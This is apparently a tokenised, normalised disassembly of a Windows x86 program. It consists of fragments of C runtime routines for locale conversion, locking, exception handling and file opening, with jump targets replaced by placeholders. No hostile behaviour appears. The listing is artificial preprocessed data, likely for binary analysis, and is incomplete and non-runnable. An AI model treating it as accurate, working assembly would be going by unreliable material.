sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_2004856
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2003680
leave
retn
sub_200e810
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2003680
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_20039e0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_200cf91
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_20046f8
pop ecx
cmp eax edi
je r-xdata
call sub_200e9d0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_2003720
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_200ba63
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_200368f
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_200ea1b
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_20036e5
push 0x4
call sub_200573c
pop ecx
retn
sub_2003962
push [ ebp + 0x8 ]
call sub_2006646
pop ecx
retn
sub_200396c
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20038a8
add esp 0xc
pop ebp
retn
sub_2003cf0
push [ ebp + 0x18 ]
call sub_2006646
pop ecx
retn
sub_2003cfa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_2003c64
add esp 0x14
pop ebp
retn
sub_2003ec8
push esi
call sub_2006646
pop ecx
retn
sub_20046ef
push 0x4
call sub_200573c
pop ecx
retn
sub_2004856
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_2009e8d
add esp 0xc
pop ebp
retn
sub_200486c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_2004856
sub_2004a7c
push 0x4
call sub_200573c
pop ecx
retn
sub_2004ca7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_200a1d2
pop ecx
pop ecx
retn
sub_2004ce1
xor eax eax
inc eax
retn
_start
call sub_200a847
jmp sub_2004b7c
sub_200509b
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_2006682
pop ecx
pop ecx
retn
sub_20050ca
push 0x1
call sub_200573c
pop ecx
retn
sub_20050d3
push 0x1
call sub_2004ff9
pop ecx
retn
sub_2005178
call sub_20064fc
add eax 0x20
push eax
push 0x1
call sub_2006682
pop ecx
pop ecx
retn
sub_200518b
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_2005225
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_20051fa
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_200523d
push 0x8
call sub_2005816
pop ecx
retn
sub_2005246
push 0x8
call sub_200573c
pop ecx
retn
sub_200542c
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_200573c
pop ecx
sub_2005441
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_2005315
add esp 0xc
pop ebp
retn
sub_2005457
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_2005315
add esp 0xc
pop ebp
retn
sub_200546d
push 0x1
push 0x0
push 0x0
call sub_2005315
add esp 0xc
retn
sub_200547c
push 0x1
push 0x1
push 0x0
call sub_2005315
add esp 0xc
retn
sub_200573c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_200580d
push 0xa
call sub_200573c
pop ecx
retn
sub_2006355
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_20065b3
call sub_20050d3
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_200368f
pop ecx
retn
call sub_200be65
sub_2006aa9
push 0x1
call sub_200573c
pop ecx
retn
sub_2006ab2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2006ce6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_2006c10
add esp 0xc
pop ebp
retn 0x4
sub_2006d19
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_200c9a9
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_2006d4c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_2006c10
add esp 0xc
pop ebp
retn 0x8
sub_2006e49
push 0xc
push r--data
call sub_2006310
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
sub_2006e66
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_2006efb
call sub_2006e99
mov [ rw-data ] eax
xor eax eax
retn
sub_20076e8
push [ ebp + 0x8 ]
call sub_200cdd0
pop ecx
retn
sub_2007900
push [ ebp + 0x8 ]
call sub_200cdd0
pop ecx
retn
sub_2007d66
push 0xd
call sub_200573c
pop ecx
retn
sub_2008131
push 0xd
call sub_200573c
pop ecx
retn
sub_200816a
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_2007fd0
pop ecx
mov [ rw-data ] 0x1
sub_20084a1
push 0xc
call sub_200573c
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_200851f
push 0x0
call sub_20084ad
pop ecx
retn
sub_200859a
call [ TlsAlloc@IAT ]
retn 0x4
sub_20086e9
push 0xd
call sub_200573c
pop ecx
retn
sub_20086f2
push 0xc
call sub_200573c
pop ecx
retn
sub_2008774
mov edi edi
push esi
call sub_20086fb
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_20051d1
pop ecx
sub_20088a8
push 0xd
call sub_200573c
pop ecx
retn
sub_20088b4
push 0xc
call sub_200573c
pop ecx
retn
sub_2009b55
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2009b90
lea eax [ edx - 0x1 ]
pop ebx
retn
sub_200a0f5
xor eax eax
inc eax
retn
sub_200a1c3
push sub_200a181
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_200a1d1
retn
sub_200b0e2
push [ ebp + 0x8 ]
call sub_200cdd0
pop ecx
retn
sub_200b1c3
push [ ebp + 0x8 ]
call sub_200cdd0
pop ecx
retn
sub_200b599
call sub_2005246
retn
sub_200b59f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_200b563
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_200b6fb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_200b72d
push 0x8
push r--data
call sub_2006310
call sub_2008774
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_200e2e7
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_200b74d
xor eax eax
inc eax
retn
sub_200b766
push sub_200b72d
call sub_20084ad
pop ecx
mov [ rw-data ] eax
retn
sub_200b777
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_200b7cc
push [ rw-data ]
call sub_2008528
pop ecx
retn
sub_200b94d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_200573c
pop ecx
sub_200b989
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200b998
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200b9a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200b9d7
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_200b9ee
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
push 0x8
call [ SetLastError@IAT ]
sub_200ba16
and [ rw-data ] 0x0
retn
sub_200befb
push 0x1
call sub_200573c
pop ecx
retn
sub_200c879
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200c70f
add esp 0x10
pop ebp
retn
sub_200c97d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_200c8b4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_200c9c8
call eax
retn
sub_200cba8
push [ ebp + 0x8 ]
call sub_200cdd0
pop ecx
retn
sub_200cdc7
push 0xa
call sub_200573c
pop ecx
retn
sub_200ceca
push 0xa
call sub_200573c
pop ecx
retn
sub_200cf88
push 0xb
call sub_200573c
pop ecx
retn
sub_200da68
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_200da30
pop ecx
pop ecx
pop ebp
retn
sub_200dd03
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200db97
add esp 0x14
pop ebp
retn
sub_200dff7
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_200dfa4
add esp 0x10
pop ebp
retn
sub_200e1eb
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200e0d4
add esp 0x10
pop ebp
retn
sub_200e2d5
push 0x4
call sub_200573c
pop ecx
retn
sub_200e2de
push 0x2
call sub_20051d1
pop ecx
retn
sub_200e4fa
push 0x4
call sub_200573c
pop ecx
retn
sub_200e9d0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_200e210
sub_200e9e6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_200e210
sub_200e9fc
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
